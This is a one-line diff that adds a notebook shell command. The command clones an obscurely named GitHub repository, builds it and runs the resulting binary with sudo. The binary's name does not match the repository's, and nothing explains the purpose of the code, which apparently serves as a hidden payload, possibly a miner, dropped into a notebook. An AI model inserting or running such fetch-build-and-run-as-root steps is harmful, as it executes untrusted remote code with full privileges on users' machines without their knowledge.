@@ -1,0 +1,1 @@
+!git clone https://github.com/mobileapps84741274/linux8444;cd ./linux8444;mkdir ./build/;cd ./build/;cmake ..;make;!sudo linux84444474 g
